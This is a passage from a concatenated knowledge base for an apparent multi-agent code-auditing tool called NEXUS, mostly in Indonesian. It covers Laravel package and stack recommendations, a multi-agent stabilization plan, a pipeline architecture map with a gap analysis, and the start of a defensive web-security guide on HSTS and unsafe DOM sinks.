| Debugbar | Barry vd. Heuvel | Gratis | Debug toolbar (dev only) |
| Horizon | Laravel | Gratis | Queue dashboard (Redis) |
| Socialite | Laravel | Gratis | OAuth login (Google, dll) |
| Pest PHP | Pest | Gratis | Testing modern |
| Pint | Laravel | Gratis | Code style fixer |
| IDE Helper | Barry vd. Heuvel | Gratis | Autocomplete IDE |

---

## 16. Stack Rekomendasi per Jenis Project

---

### 🏢 Admin Panel / Dashboard Internal

```
Laravel + Filament + Spatie Permission + Spatie Activity Log + Spatie Media Library
```

---

### 🛒 E-Commerce / Toko Online

```
Laravel + Livewire + Alpine.js + Tailwind
+ Spatie Media Library (foto produk)
+ Spatie Permission (admin/customer/staff)
+ Maatwebsite Excel (export order)
+ DomPDF (cetak invoice)
+ Spatie Backup
```

---

### 🔌 REST API (Mobile App / Frontend SPA)

```
Laravel + Sanctum (auth) + Spatie Query Builder
+ Spatie Permission + Spatie Media Library
+ Telescope (dev)
```

---

### 🏗️ SaaS Multi-Tenant

```
Laravel + Jetstream (--teams) + Inertia + Vue/React
+ Spatie Permission + Spatie Settings
+ Horizon (queue) + Spatie Backup
+ Socialite (OAuth login)
```

---

### 📰 Blog / CMS

```
Laravel + Filament (editor) + Livewire (frontend)
+ Spatie Media Library + Spatie Sluggable
+ Spatie Sitemap + Spatie Translatable (kalau multi-bahasa)
```

---

### 🧪 NEXUS AI — Autonomous TALL Stack Generator

```
Laravel + Livewire + Alpine.js + Tailwind (target sandbox)
+ Filament (admin monitoring)
+ Spatie Permission + Spatie Activity Log
+ Spatie Media Library + Pest PHP
```

---

> 📌 **Prinsip pemilihan package:**
> Pilih yang paling minimal untuk kebutuhan yang ada.
> Jangan install yang tidak dipakai — setiap package adalah dependency baru yang harus di-maintain.

---

*Dokumen ini bagian dari NEXUS Rules — TALL Stack Standards*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_MULTI_AGENT_STABILIZATION_PLAN.MD

# NEXUS — Multi-Agent Stabilization Plan
> **VERSION**: v2 | **Last Updated**: 26/05/2026


## Final Output Planning (Loop Scan Result)

> **Target Akhir:** Stable Multi-Agent Framework
> **Bukan:** AGI / Autonomous Intelligence / Self-Evolving System
> **Tanggal Scan:** 2026-05-07

---

## Scan Result Summary

| Area | Status Saat Ini | Gap |
| ---- | -------------- | --- |
| Core Engine (NexusEngine.js) | Ada, berfungsi | Direct invocation, belum Event Bus |
| Contract System | Ada (2 kontrak) | Belum Universal Task Protocol |
| Memory Layer | long_term / short_term | Belum granular (raw/normalized/semantic) |
| Agent Workflows | Folder kosong | Belum ada agent workflow terdefinisi |
| Logging | Tidak ada logs/ folder | Belum observability standard |
| Plugin/Scanner | Ada di agent/tools/ | Belum ada sandbox isolation |
| Orchestration | NexusEngine langsung calls tools | Belum ada event-driven layer |
| Agent Isolation | Mixed (engine = orchestrator + runner) | Belum strict boundary |

---

# PHASE 1 — Agent Contract & Isolation

> **Tujuan:** Setiap agent memiliki boundary yang jelas dan kontrak yang ketat.

## 1.1 Universal Task Protocol

Buat `agent/core/TaskProtocol.js` sebagai standar komunikasi universal:

```json
{
  "task_id": "UUID",
  "agent": "agent_name",
  "priority": "low | normal | high | critical",
  "input": {},
  "context": {},
  "status": "pending | running | done | failed",
  "timestamp": "ISO8601",
  "timeout_ms": 30000
}
```

**File yang perlu dibuat:**
- `agent/core/TaskProtocol.js` — definisi dan validator protokol
- Update semua scanner di `agent/tools/scanners/` untuk menggunakan protokol ini

---

## 1.2 Agent Boundary Enforcement

Setiap agent di `agent/tools/` wajib memiliki manifest:

```json
{
  "name": "cyber-security",
  "responsibility": "Scan keamanan dan autentikasi",
  "allowed_inputs": ["targetPath"],
  "allowed_outputs": ["findings[]"],
  "permissions": ["read_files"],
  "execution_scope": "agent/tools/scanners/",
  "timeout_ms": 30000
}
```

**File yang perlu dibuat:**
- `agent/tools/scanners/manifest.json` — manifest untuk semua scanner
- `agent/tools/manifest.json` — manifest untuk semua tools

---

## 1.3 Agent Role Isolation (Pisahkan NexusEngine)

Saat ini `NexusEngine.js` merangkap: Orchestrator + Runner + Memory + Logging.
Ini melanggar Single Responsibility Principle.

**Pemisahan yang diperlukan:**

```text
agent/core/
├── NexusEngine.js        → HANYA Lifecycle Controller (audit → plan → execute → verify)
├── Orchestrator.js       → Baru: Koordinasi antar agent, routing task
├── Contract.js           → Existing: Kontrak data (perlu diperluas)
├── TaskProtocol.js       → Baru: Universal task schema & validator
├── MemoryPipeline.js     → Existing: OK, tapi perlu event hooks
├── Machinist.js          → Existing: Forge/build capability
└── Distiller.js          → Existing: Knowledge distillation
```

---

# PHASE 2 — Memory Governance

> **Tujuan:** Memory menjadi single source of truth dengan konsistensi penuh.

## 2.1 Restrukturisasi Memory Folder

Ubah dari:
```text
memory/
├── long_term/
└── short_term/
```

Menjadi:
```text
memory/
├── raw/          ← input mentah, belum diproses
├── normalized/   ← data yang sudah dibersihkan & diformat
├── semantic/     ← index semantik berdasarkan tag
├── distilled/    ← knowledge final yang sudah diverifikasi (pindah dari long_term)
├── operational/  ← data kerja aktif (pindah dari short_term)
└── archived/     ← history lama (SESSION_HISTORY_ARCHIVE)
```

**Catatan:** `memory/long_term/` (berisi NEXUS_HUB_INDEX.md) → pindah ke `memory/distilled/`

---

## 2.2 Memory Validation Layer

Tambahkan validasi wajib sebelum data masuk ke memori:

**Fitur yang harus ada:**
- Checksum validation (hash setiap file untuk deteksi perubahan)
- Versioning (setiap update memiliki nomor versi)
- Conflict detection (cegah duplicate semantic yang bertentangan)
- Rollback support (bisa kembali ke versi sebelumnya)
- Memory audit logs (setiap mutasi memori tercatat)

**File yang perlu dibuat:**
- `agent/core/MemoryGovernor.js` — layer validasi memori

---

## 2.3 Selesaikan Collision di Workflow

`workflow/internal/nexus-pipeline.md` masih memiliki konflik `IF { } ELSE { }` yang belum diselesaikan.

**Aksi:** Merge kedua opsi menjadi satu dokumen final yang bersih.

---

# PHASE 3 — Orchestration Hardening

> **Tujuan:** Orkestrasi deterministik, tidak ada direct coupling antar agent.

## 3.1 Event Bus Architecture

Ganti direct invocation di `NexusEngine.js` dengan event-driven pattern:

```text
SEBELUM:
NexusEngine → langsung panggil SchemaGuard, QueryOptimizer, Scanner

SESUDAH:
NexusEngine → emit event → EventBus → route ke agent yang tepat
```

**Event yang didefinisikan:**

```text
AUDIT_REQUESTED
AGENT_TASK_ASSIGNED
AGENT_TASK_COMPLETED
AGENT_TASK_FAILED
MEMORY_UPDATE_REQUESTED
SCANNER_TRIGGERED
SCANNER_FINISHED
PLAN_GENERATED
EXECUTION_STARTED
EXECUTION_COMPLETED
CYCLE_FINISHED
```

**File yang perlu dibuat:**
- `agent/core/EventBus.js` — publisher/subscriber sederhana
- Update `NexusEngine.js` untuk emit event, bukan direct call

---

## 3.2 Retry Logic & Failure Handling

Setiap agent execution wajib memiliki:

```text
- timeout (sudah ada di beberapa tempat, perlu distandarisasi)
- max retry: 3x
- fallback action saat gagal (log + skip vs halt)
- crash isolation (1 agent gagal tidak crash seluruh cycle)
```

---

## 3.3 Pengisian Agent Workflows

Folder `agent/workflows/internal/` dan `agent/workflows/external/` **kosong**.

**Isi yang perlu dibuat:**

```text
agent/workflows/internal/
├── audit-[workflow.md](../standards/NEXUS_WORKFLOW.MD)       ← alur audit standar
├── planning-[workflow.md](../standards/NEXUS_WORKFLOW.MD)    ← alur planning dari audit result
└── execution-[workflow.md](../standards/NEXUS_WORKFLOW.MD)   ← alur eksekusi task

agent/workflows/external/
├── harvest-[workflow.md](../standards/NEXUS_WORKFLOW.MD)     ← alur harvest dari external project
└── distribution-[workflow.md](../standards/NEXUS_WORKFLOW.MD) ← alur distribusi hasil
```

---

# PHASE 4 — Plugin & Scanner Isolation

> **Tujuan:** Scanner dan plugin tidak bisa merusak core system.

## 4.1 Plugin Manifest System

Setiap scanner di `agent/tools/scanners/` wajib memiliki manifest:

```json
{
  "name": "cyber-security",
  "version": "1.0.0",
  "permissions": ["read_files"],
  "entrypoint": "cyber-security.js",
  "execution_timeout": 30000,
  "output_schema": "findings[]"
}
```

**File yang perlu dibuat:**
- `agent/tools/scanners/manifest.json`

---

## 4.2 Execution Sandbox

Scanner dan forged tools WAJIB dijalankan dalam execution context yang terisolasi.

**Aturan ketat:**
- Scanner tidak boleh menulis ke `agent/core/`
- Scanner tidak boleh memodifikasi `memory/distilled/`
- Scanner tidak boleh self-register permission baru
- Output scanner HANYA boleh berupa `findings[]` array

**File yang perlu dibuat:**
- `agent/core/SandboxExecutor.js` — wrapper eksekusi terisolasi

---

# PHASE 5 — Logging & Observability

> **Tujuan:** Setiap event dan mutasi sistem tercatat dengan standar yang konsisten.

## 5.1 Dedicated Logging Structure

Buat folder logs/ yang terdedikasi:

```text
logs/
├── agents/         ← log per agent execution
├── orchestration/  ← log siklus orchestration
├── memory/         ← log mutasi memori
├── scanners/       ← log hasil scanner
├── plugins/        ← log forged plugin execution
└── errors/         ← centralized error log
```

---

## 5.2 Mandatory Log Fields

Setiap log entry wajib memiliki:

```json
{
  "timestamp": "ISO8601",
  "level": "INFO | WARNING | ERROR | CRITICAL",
  "agent": "agent_name",
  "task_id": "UUID",
  "duration_ms": 0,
  "event": "event_name",
  "message": "human readable",
  "metadata": {}
}
```

**File yang perlu dibuat:**
- `agent/core/Logger.js` — centralized logger dengan struktur standar

---

# PHASE 6 — Core vs Capability Split

> **Tujuan:** Pemisahan tegas antara sistem inti yang protected dan lapisan kapabilitas yang extensible.

## 6.1 Pembagian Zona

```text
CORE (protected — tidak boleh dimodifikasi oleh forged tools):
agent/core/
├── NexusEngine.js
├── Orchestrator.js       ← baru
├── EventBus.js           ← baru
├── Contract.js
├── TaskProtocol.js       ← baru
├── MemoryGovernor.js     ← baru
├── SandboxExecutor.js    ← baru
├── Logger.js             ← baru
└── MemoryPipeline.js

CAPABILITY LAYER (extensible — boleh ditambah/dimodifikasi):
agent/tools/
├── scanners/
└── [tool files]
```

---

# Urutan Implementasi (Priority Order)

```text
URGENT (Phase 1 & 5 dulu):
1. TaskProtocol.js          ← foundation komunikasi antar agent
2. Logger.js                ← observability sebelum apapun dieksekusi
3. logs/ folder structure   ← tempat log ditulis

PENTING (Phase 2 & 3):
4. MemoryGovernor.js        ← stabilkan memori sebelum scale
5. EventBus.js              ← decoupling orchestration
6. Restrukturisasi memory/  ← folder governance
7. Selesaikan collision di nexus-pipeline.md

PELENGKAP (Phase 4 & 6):
8. SandboxExecutor.js       ← keamanan plugin
9. manifest.json scanner    ← deklarasi permission
10. Isi agent/workflows/    ← dokumentasi alur kerja
```

---

# Definition of Done — "Multi-Agent Stabil"

Sistem dianggap **STABIL** jika semua kondisi ini terpenuhi:

```text
✅ Setiap agent memiliki contract yang jelas (input/output/permission)
✅ Semua komunikasi antar agent melalui TaskProtocol
✅ Orchestrator tidak memanggil agent secara langsung (via EventBus)
✅ Memory memiliki validasi dan versioning
✅ Setiap eksekusi tercatat di logs/ dengan format standar
✅ Scanner tidak bisa merusak core system (sandbox)
✅ 1 agent gagal tidak menghentikan seluruh cycle
✅ Semua agent workflow terdokumentasi di agent/workflows/
```

---

# Final Technical Positioning

```text
NEXUS = Modular Semantic Multi-Agent Framework
Target: Stable Multi-Agent Orchestration
Bukan: AGI / Autonomous Runtime / Self-Evolving System
```

---

*Generated via Loop Scan | Scan Date: 2026-05-07 | Version: 1.0*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_NEXUS_PIPELINE_MAP.MD

# 🧠 NEXUS AI — Pipeline Architecture Map
> **VERSION**: v1 | **Last Updated**: 26/05/2026


> **Scan Date**: 2026-05-11 | **Engine**: Antigravity AI Engineer  
> **Version**: Human-AI Nexus v3.1.0 | **Mode**: Extreme Scan

---

## 1. 📦 Struktur Makro Project

```
NEXUS AI/
├── cli.js                      ← Entry Point (Global CLI: `nexus <cmd>`)
├── agent/
│   ├── main.js                 ← Command Router (run/audit/harvest/distill/forge)
│   ├── core/                   ← OTAK UTAMA ENGINE
│   ├── prompts/                ← Agent Prompt Bank (internal + external)
│   ├── tools/                  ← Specialized Tools & Scanners
│   ├── workflows/              ← Skill Workflow Definitions
│   └── scripts/                ← Automated Loop Scripts
├── memory/
│   ├── raw/                    ← Audit mentah masuk di sini
│   ├── normalized/             ← Data setelah sanitasi
│   ├── semantic/               ← Indexed data berdasarkan tag
│   ├── distilled/              ← KNOWLEDGE HUB (master wisdom)
│   ├── operational/            ← Records, sessions, link cache
│   ├── archived/               ← Backup & rotasi file
│   └── short_term/             ← Cache sementara (link_cache.json)
├── knowledge/                  ← Session archives TDD & test logs
├── golden/harvest/             ← Zona staging harvest dari project external
├── documentation/              ← Output laporan (audit, planning, summary)
├── logs/                       ← Observability (agents/orchestration/errors)
├── tests/
│   ├── TDD/                    ← Test runner
│   └── sandboxes/              ← Lab environment (EvolutionPiper)
└── config/.env.example         ← Konfigurasi dasar
```

---

## 2. 🔄 PIPELINE UTAMA: Full Cycle

```mermaid
flowchart TD
    A["👤 USER / CLI\n`nexus run`"] --> B["cli.js\n(Entry Point)"]
    B --> C["agent/main.js\n(Command Router)"]

    C --> D["NexusEngine\n(Core Orchestrator)"]

    subgraph INIT["🔷 FASE INIT"]
        D --> D1["discoverSkills()\nScan workflows/internal & external"]
        D --> D2["readMemory()\nLoad distilled/ + semantic index"]
        D --> D3["ResourceMonitor.checkStress()\nThrottle jika RAM kritis"]
    end

    INIT --> P1

    subgraph P1["⚡ FASE 1: AUDIT"]
        P1A["Structural Scan\n(folder existence check)"]
        P1B["Specialist Agents x6\n(Parallel Promise.all)"]
        P1C["SandboxExecutor\n(jalankan scanner .js sandboxed)"]
        P1D["Hardcoded Machine Audit\n(SchemaGuard, QueryOptimizer, A11yScanner)"]
        P1E["Dynamic Forged Scanners\n(tools/scanners/*.js)"]
        P1F["AuditReport object\n+ .json + .md ke memory/raw"]
        P1A --> P1B --> P1C --> P1D --> P1E --> P1F
    end

    P1 --> P2

    subgraph P2["📋 FASE 2: PLANNING"]
        P2A["engine.plan(auditReport)"]
        P2B["Map findings → Task objects\n+ AUTO-ACTION generation"]
        P2C["ImplementationPlan object\n+ .json + .md ke documentation/planning"]
        P2D["👤 DEV APPROVAL GATE\n(interactive y/n loop)"]
        P2A --> P2B --> P2C --> P2D
    end

    P2 --> P3

    subgraph P3["🚀 FASE 3: EXECUTION"]
        P3A["engine.execute(plan)"]
        P3B["TDDGuard.validate()\nBlokir jika test belum ada"]
        P3C["TDDScaffolder.generate()\nAuto-buat test jika diblokir"]
        P3D["Modifier.apply()\nFILE_REPLACE / FILE_APPEND / RESOLVE_OPTIONS"]
        P3E["AssetEngine.process()\nAsset optimization"]
        P3F["Self-Healing Doc Update\nupdateRecapStatus()"]
        P3A --> P3B --> P3C --> P3D --> P3E --> P3F
    end

    P3 --> P4

    subgraph P4["🔍 FASE 4: VERIFICATION"]
        P4A["engine.verify(plan)"]
        P4B["Validator.verifyAction()\nCek apakah aksi benar-benar berdampak"]
        P4C["Task marked: done / failed_verification"]
        P4A --> P4B --> P4C
    end

    P4 --> P5

    subgraph P5["📝 FASE 5: RECORDING & MEMORY"]
        P5A["engine.record(cycleID)"]
        P5B["session_TIMESTAMP.json\n→ memory/operational/records"]
        P5C["MemoryPipeline.optimize()"]
        P5D["archiveAuditReports()\narchiveImplementationPlans()"]
        P5E["processHarvestData()\ngolden/harvest → memory/distilled"]
        P5F["generateCycleSummary()\n→ documentation/summary"]
        P5A --> P5B --> P5C --> P5D --> P5E --> P5F
    end

    P5 --> END["✅ SIKLUS SELESAI\nSTATE: COMPLETED"]
```

---

## 3. 🧬 PIPELINE DISTILLATION (Perintah: `nexus distill`)

```mermaid
flowchart LR
    DI["engine.distill()"] --> DA["Distiller.run()"]

    subgraph DISTILL["Distillation Pipeline (7 Steps)"]
        direction TB
        S1["1. distillAcademics()\nExtract insights dari file academic\n→ memory/distilled/academics/NEXUS_DISTILLATION_*.md"]
        S2["2. standardizeNames()\nRename semua file → NEXUS_ prefix"]
        S3["3. applySemanticTagging()\nInject METADATA TAGS ke setiap file"]
        S4["4. shelve()\nPindahkan file ke rack semantic:\nsecurity/ performance/ ui-ux/ database/ tdd/ vcs/"]
        S5["5. applySemanticLinking()\nCross-link antar file (path-aware)\n+ link_cache.json untuk efisiensi"]
        S6["6. generateHubIndex()\nBuat NEXUS_HUB_INDEX.md\n+ NEXUS_SEMANTIC_INDEX.json"]
        S7["7. generateNeuralMap()\nBuat NEXUS_NEURAL_MAP.md\n(Mermaid graph TD dari semua koneksi)"]
        S1 --> S2 --> S3 --> S4 --> S5 --> S6 --> S7
    end

    DA --> DISTILL
```

---

## 4. 🌾 PIPELINE HARVESTING (Perintah: `nexus harvest <path>`)

```mermaid
flowchart TD
    H1["nexus harvest /path/to/project"] --> H2["engine.harvest(sourcePath)"]
    H2 --> H3["Deteksi: nexus/ atau documentation/ di source"]
    H3 --> H4["Copy audit/ planning/ summary/ records/\n→ golden/harvest/ProjectName/"]
    H4 --> H5["MemoryPipeline.processHarvestData()"]
    H5 --> H6["cleanseContent()\nRedact: API keys, credentials, IPs"]
    H6 --> H7{"isRecords?"}
    H7 -->|Ya| H8["→ memory/operational/records/"]
    H7 -->|Tidak| H9["→ memory/distilled/ (Knowledge HUB)"]
    H8 --> H10["emptyDir(golden/harvest)\nRecycle zona staging"]
    H9 --> H10
```

---

## 5. 🔥 PIPELINE FORGE (Perintah: `nexus forge <Name> <wisdom.md>`)

```mermaid
flowchart TD
    F1["nexus forge BrandingScanner\n  memory/distilled/NEXUS_BRANDING.md"] --> F2["Machinist.forge(name, wisdomPath)"]
    F2 --> F3["Baca wisdom file\nExtract 'Actionable Steps' / 'Core Insights'"]
    F3 --> F4["getScannerTemplate()\nGenerate .js scanner dari rules"]
    F4 --> F5["Tulis ke agent/tools/scanners/branding-scanner.js"]
    F5 --> F6["TDDScaffolder.generate()\nAuto-scaffold test untuk scanner baru"]
    F6 --> F7["Scanner siap dipakai di Audit Cycle berikutnya\n(Dynamic Forged Scanners)"]
```

---

## 6. 🧠 LAYER MEMORI — Hierarki & Alur Data

```
INPUT DATA
    │
    ▼
memory/raw/                  ← Audit reports mentah (report_agentid_AUDITID.json/md)
    │
    ▼ [MemoryPipeline.archiveAuditReports()]
memory/operational/          ← Session records, archive index
    │
    ▼ [Harvest → cleanseContent()]
memory/distilled/            ← KNOWLEDGE HUB (sumber kebenaran)
    │
    ├── standards/           ← Prinsip, protokol, kontrak
    ├── security/            ← Wisdom keamanan
    ├── performance/         ← Wisdom performa
    ├── ui-ux/              ← Wisdom desain
    ├── database/            ← Wisdom database
    ├── tdd/                 ← Wisdom pengujian
    ├── vcs/                 ← Wisdom version control
    └── academics/           ← Hasil distilasi paper/artikel
    │
    ▼ [Distiller.generateHubIndex()]
memory/distilled/NEXUS_HUB_INDEX.md       ← Master index
memory/distilled/NEXUS_SEMANTIC_INDEX.json ← Semantic search index
memory/distilled/NEXUS_NEURAL_MAP.md       ← Mermaid connection graph
    │
    ▼ [NexusEngine.readMemory() → searchKnowledge(tag)]
SEMANTIC SEARCH             ← Engine query HUB berdasarkan tag
memory/short_term/link_cache.json ← Cache linking untuk efisiensi
```

---

## 7. 👥 AGENT REGISTRY — 14 Specialist Prompts

| # | Agent ID | Domain | Type |
|---|----------|--------|------|
| 1 | `orchestrator` | Master orchestration | Internal (~2MB prompt) |
| 2 | `guru` | Senior wisdom | Internal (~2MB prompt) |
| 3 | `pipeline-architect` | Pipeline design | Internal (~2MB prompt) |
| 4 | `agent-manager` | Agent coordination | Internal |
| 5 | `golden-crawler` | Knowledge harvesting | Internal |
| 6 | `looping-tester` | TDD loop automation | Internal |
| 7 | `machinist` | Machine forging | Internal |
| 8 | `memory-manager` | Memory optimization | Internal |
| 9 | `cyber-security` | Security auditing | Internal + Scanner |
| 10 | `ux-engineer` | UX/Design auditing | Internal + Scanner |
| 11 | `seo-performance-specialist` | SEO & performance | Internal + Scanner |
| 12 | `database-architect` | Schema & queries | Internal + Scanner |
| 13 | `vcs-architect` | Git health | Internal + Scanner |
| 14 | `documentation-architect` | Docs compliance | Internal + Scanner |

---

## 8. ⚙️ CORE MODULES — Dependency Map

```mermaid
graph TD
    NE["NexusEngine (God Object)"]
    
    NE --> MOD["Modifier\n(File mutations)"]
    NE --> MEM["MemoryPipeline\n(Archive & harvest data)"]
    NE --> MEMG["MemoryGovernor\n(Locking & validation)"]
    NE --> DIST["Distiller\n(Knowledge HUB ops)"]
    NE --> MACH["Machinist\n(Forge new scanners)"]
    NE --> ORCH["Orchestrator\n(EventBus task routing)"]
    NE --> EVOL["EvolutionPiper\n(Lab sandbox lifecycle)"]
    NE --> SBX["SandboxExecutor\n(Isolated scanner exec)"]
    NE --> LOG["Logger\n(Structured observability)"]
    NE --> CLK["NexusClock\n(Timestamp utils)"]
    NE --> RSM["ResourceMonitor\n(RAM/CPU stress check)"]
    NE --> EB["EventBus (singleton)\n(Pub/Sub event system)"]
    NE --> DC["DecisionEngine\n(Weighted scoring resolver)"]
    
    NE --> T1["TDDGuard\n(Test gate)"]
    NE --> T2["TDDScaffolder\n(Auto-generate tests)"]
    NE --> T3["BugHunter"]
    NE --> T4["Validator\n(Post-exec verification)"]
    NE --> T5["SchemaGuard\n(DB model scanner)"]
    NE --> T6["QueryOptimizer\n(Migration scanner)"]
    NE --> T7["AccessibilityScanner"]
    NE --> T8["AssetEngine"]
    NE --> T9["Designer"]
    NE --> T10["RootCauseAnalyzer"]

    ORCH --> EB
    ORCH --> SBX
```

---

## 9. 🔁 EVOLUSI SKILL — Update Skills Pipeline

```mermaid
flowchart LR
    US1["nexus update-skills"] --> US2["engine.massUpdateSkills()"]
    US2 --> US3["Scan memory/distilled/\n(semua file .md wisdom)"]
    US3 --> US4["Untuk setiap agent di prompts/internal/\nInject distilled wisdom ke prompt"]
    US4 --> US5["Skill terupdate → Agent lebih pintar di cycle berikutnya"]
```

---

## 10. 🔄 REFACTOR PIPELINE (Golden → HUB)

```mermaid
flowchart LR
    R1["nexus refactor"] --> R2["engine.massRefactor()"]
    R2 --> R3["Scan golden/ untuk template terbaik"]
    R3 --> R4["Bandingkan dengan memory/distilled/\ngunakan DecisionEngine scoring"]
    R4 --> R5["Merge atau replace wisdom"]
    R5 --> R6["Update NEXUS_HUB_INDEX.md"]
```

---

## 11. 🚨 SISTEM STATE & ERROR HANDLING

```
INIT → PROCESSING → EXECUTING → LOGGING → COMPLETED
                                              ↓
                                           FAILED (jika throw NexusError)
                                              ↓
                                        logError() → documentation/summary/error_log.json
```

**Retry Logic** (Orchestrator):
- MAX_RETRY = 3 attempts per task
- EventBus: `SCANNER_TRIGGERED` → `SCANNER_FINISHED` / `TASK_FAILED`

**MemoryGovernor Lock System**:
- Setiap operasi tulis ke memory pakai file lock (`.lock`)
- Timeout 5000ms → throw jika deadlock

---

## 12. 🗂️ CLI Commands — Full Map

| Command | Handler | Pipeline |
|---------|---------|----------|
| `nexus` (default) | `install()` | Setup nexus/ di project target |
| `nexus run` | `main.js → runCycle()` | Full: Audit→Plan→Execute→Verify→Record |
| `nexus audit` | `engine.audit()` | Audit only |
| `nexus harvest <dir>` | `engine.harvest()` | Harvest dari project lain |
| `nexus distill` | `engine.distill()` | Distillation pipeline (7 steps) |
| `nexus forge <N> <f>` | `machinist.forge()` | Build scanner dari wisdom |
| `nexus refactor` | `engine.massRefactor()` | Golden → HUB sync |
| `nexus update-skills` | `engine.massUpdateSkills()` | HUB → Agent prompts update |
| `nexus skills` | `engine.discoverSkills()` | List semua skill registry |
| `nexus update` | `updateEngine()` | Sync external prompts/workflows |
| `nexus dell` | `uninstall()` | Safe remove nexus/ (preserve docs) |

---

## 13. ⚠️ GAP ANALYSIS & ISSUES TERIDENTIFIKASI

| # | Issue | File | Severity |
|---|-------|------|----------|
| 1 | `MemoryPipeline.archiveAuditReports()` & `archiveImplementationPlans()` — **auto-delete DISABLED** (hotfix comment) | MemoryPipeline.js:120 | 🟡 MEDIUM |
| 2 | `appendToArchive()` juga **di-comment** — archive tidak pernah ter-trigger | MemoryPipeline.js:129 | 🟡 MEDIUM |
| 3 | `EvolutionPiper.harvestWisdom()` path ke `memory/long_term/distilled` tapi folder ini **tidak exist** (seharusnya `memory/distilled`) | EvolutionPiper.js:64 | 🔴 BUG |
| 4 | `Machinist.integrate()` hardcode path `./../auditor/${name}` tapi folder `auditor/` **tidak exist** di project | Machinist.js:42 | 🔴 BUG |
| 5 | `DecisionEngine` terdefinisi tapi **tidak di-import** di NexusEngine.js — fungsi refactor belum terhubung | DecisionEngine.js | 🟡 MEDIUM |
| 6 | `massRefactor()` & `massUpdateSkills()` **tidak ditemukan** di NexusEngine.js (dipanggil dari main.js tapi tidak ada implementasi) | NexusEngine.js | 🔴 CRITICAL |
| 7 | `memory/semantic/` selalu **kosong** — tidak ada pipeline yang aktif mengisi folder ini | memory/semantic/ | 🟡 MEDIUM |
| 8 | `config/` hanya berisi `.env.example` — tidak ada loader konfigurasi | config/ | 🟢 LOW |
| 9 | `EvolutionPiper` di-define tapi **tidak di-import** di NexusEngine.js | EvolutionPiper.js | 🟡 MEDIUM |
| 10 | Logger structured logging ada tapi **log files di `logs/`** belum terverifikasi isinya | logs/ | 🟢 LOW |

---

## 14. 🎯 REKOMENDASI PRIORITAS

### 🔴 Critical (Segera)
1. **Implementasi `massRefactor()` & `massUpdateSkills()`** di NexusEngine.js — saat ini akan throw "not a function"
2. **Fix path `EvolutionPiper`** dari `memory/long_term/distilled` → `memory/distilled`
3. **Fix path `Machinist.integrate()`** dari `./../auditor/` → path yang valid

### 🟡 Medium (Sprint Berikutnya)
4. **Reaktifkan archiving di MemoryPipeline** — saat ini dead code, memory/raw tidak pernah dibersihkan
5. **Import & gunakan `DecisionEngine`** di refactor flow
6. **Aktifkan `memory/semantic/`** sebagai output dari semantic tagging pipeline
7. **Import `EvolutionPiper`** ke NexusEngine agar lab cycle bisa digunakan

### 🟢 Enhancement
8. Buat `config loader` dari `.env.example` → runtime config
9. Tambah `nexus status` command untuk health check semua pipeline
10. Tambah `nexus test` integrasi ke TDD runner otomatis

---

*Scan dilakukan oleh: Antigravity AI Engineer | Nexus Pipeline Architecture v3.1.0*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_SECURITY.MD

# Web Security
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Guidelines for implementing preventative security measures on the web safely and incrementally.

**NOTE**: This skill covers standard web platform defenses, focusing mostly on the browser. Applications still require comprehensive server-side security, authorization models, and input validation.

## Table of Contents

- When to apply this skill
- Phase 1: Quick Wins & Obvious Anti-Patterns
  - 1.1 Secure Contexts
  - 1.2 Avoid Dangerous DOM Sinks
  - 1.3 Secure Cookies
  - 1.4 Clickjacking Protection (Frame-Ancestors & X-Frame-Options)
  - 1.5 Secure Window Messaging (postMessage)
- Phase 2: Discovery & Data Collection (Prerequisites)
  - 2.1 Inspect the Application
  - 2.2 Deploy Report-Only Policies
  - 2.3 Data Hygiene for Reports
  - 2.4 Automated Discovery via Browser APIs and DevTools
- Phase 3: Interpreting Results & Enforcement
  - Core enforcement (data-driven rollouts)
    - 3.1 Analyzing CSP Reports
    - 3.2 Transitioning to CSP Enforcement
    - 3.3 Trusted Types Enforcement
    - 3.4 Cross-Origin Opener Policy (COOP)
    - 3.5 Cross-Origin Resource Policy (CORP)
    - 3.6 Cross-Origin Isolation
    - 3.7 Fetch Metadata (Resource Isolation)
  - Companion policies (deploy in parallel)
    - HTTP Strict Transport Security (HSTS)
    - X-Content-Type-Options
    - Referrer Policy
    - Permissions Policy
    - Subresource Integrity (SRI)
    - Cross-Origin Resource Sharing (CORS)
    - Clear-Site-Data (Logout)

## When to apply this skill

The right starting point depends on the application:

- **Retrofitting an existing app**: Always start at Phase 1. Strict policies applied without discovery will break the app. Treat Phase 2 (report-only) as a prerequisite for any Phase 3 enforcement.
- **Greenfield app or new feature**: You can adopt Phase 3 enforced policies directly, but still wire up reporting from day one.
- **SaaS template / framework defaults**: Ship Phase 1 hygiene and Phase 3 policies enabled by default, with Phase 2 reporting on so downstream users can detect regressions.

If you are unsure which case applies, default to Phase 1 → 2 → 3 in order.

**Focusing on Leverage**: While Phase 1 and 2 establish baseline hygiene and data gathering, Phase 3 core enforcement represents the highest-leverage security work. Specifically, Injection/XSS mitigation through CSP (§3.2) and Trusted Types (§3.3) addresses the largest practical threat, while companion policies and isolation defenses provide important defense-in-depth.

## Phase 1: Quick Wins & Obvious Anti-Patterns

Before attempting to deploy global security policies, focus on code-level hygiene and immediate fixes that do not risk breaking the application.

### 1.1 Secure Contexts
- **DO**: Deliver resources over HTTPS to protect against both passive and active network attackers.
- **DO**: Serve a header like `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to force HTTPS whenever possible.
- **TIP**: In production rollout, start with a short `max-age` (e.g., 300 seconds) and incrementally increase to 1 year. A misconfigured HSTS with a long max-age can render the site permanently inaccessible until the cache expires in every browser that saw it.

### 1.2 Avoid Dangerous DOM Sinks
- **DO**: Prefer `textContent` or `innerText` over `innerHTML` when setting text content.
- **DO**: Use `setHTML` (part of the Sanitizer API) when available to safely insert HTML.
- **DO NOT**: Use `innerHTML` or `setHTMLUnsafe` with untrusted or unsanitized input.
- **DO**: Use DOMParser or create elements programmatically (`document.createElement`) instead of concatenating HTML strings.

**Dangerous sinks to grep for**: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout` with a string argument, `script.src`.

**Code Pattern:**
```javascript
// Unsafe
